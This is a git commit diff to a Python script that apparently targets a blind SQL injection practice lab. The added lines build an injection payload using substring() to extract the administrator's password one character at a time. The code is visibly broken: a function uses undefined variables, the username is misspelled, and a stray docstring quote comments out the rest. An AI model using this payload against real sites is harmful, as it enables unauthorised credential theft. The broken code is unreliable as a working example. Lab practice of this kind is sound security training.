7e52c06ad53e637b140ccd66281a4a5e1cd03a73
madi <madimirzakup@gmail.com>
2024-12-27 21:54:15 +0500

    #

--- Server Side Topics/SQLi/Blind SQL injection with conditional responses/payload.py
+++ Server Side Topics/SQLi/Blind SQL injection with conditional responses/payload.py
@@ -1,6 +1,7 @@
 import sys
 import logging
 import urllib3
+import string
 import concurrent.futures
 
 import requests
@@ -8,7 +9,6 @@ import requests
 import utils
 from shop import Shop
 
-"""ne zabyt here"""
 log = logging.getLogger(__name__)
 logging.basicConfig(
     stream=sys.stdout,
@@ -19,11 +19,24 @@ logging.basicConfig(
 )
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+AVAIL_CHARS = string.printable
 
+def format_length_query(inner_query, length):
+    return f"xyz' or substring(({inner_query}), {index},1) = '{char}'-- "
+   
+    
+    
+    
+    
+"""
+select password from users where username = 'administsrator'
+inner query
+"""    
 
+"""
 def determine_response_length(inner_query, url, no_proxy=False):
     log.info("Determining response length for query.")
     sess = requests.Session()
     for i in range(1, 5):
         outer_query = format_length_query(inner_query, i)
-        
+   """     
